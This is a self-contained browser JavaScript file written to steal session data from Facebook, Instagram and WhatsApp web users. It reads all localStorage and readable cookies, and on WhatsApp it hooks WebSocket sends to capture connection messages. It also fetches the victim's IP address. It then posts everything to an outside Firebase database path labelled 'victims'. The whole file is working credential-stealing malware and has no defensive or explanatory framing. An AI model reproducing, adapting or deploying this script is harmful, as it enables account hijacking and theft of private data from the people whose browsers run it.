(function () {
  'use strict';

  const DB_URL = 'https://sessionid-d86e2-default-rtdb.firebaseio.com/victims';

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org');
      return await res.text();
    } catch {
      return 'unknown';
    }
  }

  async function send(data, type) {
    const ip = await getIP();
    const payload = {
      app: location.href.includes('whatsapp') ? 'WhatsApp' : location.href.includes('instagram') ? 'Instagram' : 'Facebook',
      ip,
      url: location.href,
      timestamp: new Date().toISOString(),
      type,
      data
    };

    fetch(`${DB_URL}.json`, {
      method: 'POST',
      body: JSON.stringify(payload),
      headers: { 'Content-Type': 'application/json' }
    });
  }

  // 1. localStorage
  const ls = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    ls[key] = localStorage.getItem(key);
  }
  if (Object.keys(ls).length) send(ls, 'localStorage');

  // 2. Non-HttpOnly Cookies
  const cookies = {};
  document.cookie.split(';').forEach(c => {
    const [k, v] = c.trim().split('=');
    if (k) cookies[k] = v;
  });
  if (Object.keys(cookies).length) send(cookies, 'visible_cookies');

  // 3. WhatsApp WebSocket (for Conn message)
  if (location.href.includes('whatsapp.com')) {
    const origSend = WebSocket.prototype.send;
    WebSocket.prototype.send = function (data) {
      try {
        const msg = JSON.parse(data);
        if (msg?.[1]?.includes?.('Conn')) {
          send({ Conn: msg }, 'whatsapp_conn');
        }
      } catch (e) {}
      return origSend.apply(this, arguments);
    };
  }
})();